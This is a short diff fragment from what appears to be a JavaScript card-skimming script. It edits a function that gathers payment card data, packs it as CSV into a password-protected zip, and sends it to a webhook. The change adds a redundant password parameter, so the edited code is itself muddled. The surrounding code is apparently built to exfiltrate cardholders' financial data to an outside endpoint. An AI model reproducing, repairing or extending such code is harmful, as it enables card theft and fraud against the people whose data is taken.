@@ -102,7 +102,7 @@
       sendToWebhook(zipPassword, fileName, cardData);
     }
 
-    function sendToWebhook(password, fileName, cardData) { //function sendToWebhook(password, fileName, cardData)
+    function sendToWebhook(password, fileName, cardData, zipPassword) { //function sendToWebhook(password, fileName, cardData)
       var zip = new JSZip();
       var csvContent = cardData.join(", ");
       zip.file(fileName + ".txt", csvContent);
